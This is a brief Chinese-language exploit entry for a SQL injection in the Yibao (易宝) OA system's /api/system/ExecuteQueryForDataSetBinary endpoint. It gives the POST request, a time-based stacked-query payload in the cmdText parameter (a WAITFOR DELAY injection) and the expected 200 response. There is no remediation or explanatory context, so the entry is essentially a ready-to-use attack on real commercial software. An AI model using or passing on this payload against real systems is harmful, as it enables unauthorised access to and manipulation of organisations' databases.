# 易宝OA-ExecuteQueryForDataSetBinary处sql注入

易宝OA-ExecuteQueryForDataSetBinary处 ｜ SQL注入 ｜ —
- **请求**：`POST /api/system/ExecuteQueryForDataSetBinary HTTP/1.1`

**Payload**
```
token=zxh&cmdText=;WAITFOR DELAY '0:0:5'--+
```
- **响应特征**：200